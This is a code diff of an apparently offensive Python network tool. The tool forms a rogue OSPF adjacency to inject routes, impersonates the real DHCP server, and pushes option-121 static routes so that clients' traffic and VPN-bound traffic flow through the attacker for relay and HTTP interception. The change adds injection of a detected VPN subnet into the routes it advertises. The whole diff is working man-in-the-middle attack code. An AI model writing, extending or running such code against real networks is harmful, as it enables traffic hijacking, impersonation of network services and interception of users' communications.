@@ -322,7 +322,7 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
 
 # ── Network setup + OSPF adjacency ───────────────────────────────────────────
 
-def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
+def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets=None):
     """Configure our IP, discover the real DHCP server, form OSPF adjacency.
 
     Steps:
@@ -413,6 +413,7 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
         area_id=ospf_params["area_id"],
         hello_interval=ospf_params["hello_interval"],
         dead_interval=ospf_params["dead_interval"],
+        extra_subnets=vpn_subnets or [],
     )
     ospf_adjacency.wait_for_adjacency_exchange(interface, our_ip)
     return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets
@@ -456,9 +457,19 @@ def main():
     ospf_iface_for_fwd = None
     loopback_alias_ip = None
     try:
-        # ── Phase 2+3: configure IP, untagged discover, OSPF adjacency ───────
+        # ── Phase 2: detect VPN now so its subnet is included in OSPF injection ─
+        # detect_vpn_subnet() starts OpenVPN if needed and returns the /24 target
+        # subnet.  We pass it to setup_and_form_adjacency so the adjacency engine
+        # injects it as an OSPF stub alongside the DHCP server /32 — this makes
+        # the SVI route VPN-bound traffic back to us after option-121 installs.
+        pre_tun, pre_vpn_net24 = vpn_relay.detect_vpn_subnet()
+        vpn_subnets = [pre_vpn_net24] if pre_vpn_net24 else []
+        if pre_vpn_net24:
+            print_step("OK", f"VPN detected: {pre_tun} → subnet {pre_vpn_net24} (will inject via OSPF)")
+
+        # ── Phase 3: configure IP, untagged discover, OSPF adjacency ──────────
         ospf_interface, our_ip, offer, loopback_alias_ip, lsdb_subnets = setup_and_form_adjacency(
-            interface, ospf_params, target_ip=args.target
+            interface, ospf_params, target_ip=args.target, vpn_subnets=vpn_subnets,
         )
         ospf_iface_for_fwd = ospf_interface
 
@@ -468,16 +479,18 @@ def main():
         # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
         networks = []
         proposed_leases = {}
-        # Use the real DHCP server IP as source_ip so all OFFERs/ACKs carry
-        # server_id = real_server_ip — clients see us as the legitimate server.
-        # Falls back to our interface IP if we never learned the real server IP.
         server_identity = loopback_alias_ip or our_ip
         server_details = build_server_details_from_ospf(
             ospf_interface, ospf_params, server_identity,
+            relay_ip=our_ip,   # ARP-resolvable interface IP for option 121 next-hop
             offer=offer, dns=getattr(args, "dns", None),
         )
 
-        tun_iface = vpn_relay.enable_vpn_relay(server_details, ospf_interface)
+        # Pass pre-detected tun/subnet so enable_vpn_relay skips re-detection.
+        tun_iface = vpn_relay.enable_vpn_relay(
+            server_details, ospf_interface,
+            tun=pre_tun, vpn_net24=pre_vpn_net24,
+        )
 
         # ── Phase 6: HTTP interception on the traffic we now carry ───────────
         # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
